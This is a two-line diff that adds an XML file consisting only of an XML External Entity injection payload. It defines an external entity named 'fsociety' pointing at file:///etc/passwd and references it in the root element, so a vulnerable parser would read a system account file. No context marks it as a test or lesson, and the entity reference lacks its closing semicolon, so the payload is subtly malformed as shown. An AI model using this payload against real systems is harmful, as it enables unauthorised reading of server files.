@@ -1,0 +1,2 @@
+<!DOCTYPE pjrox [<!ENTITY fsociety SYSTEM "file:///etc/passwd">]>
+<pjrox>&fsociety</pjrox>
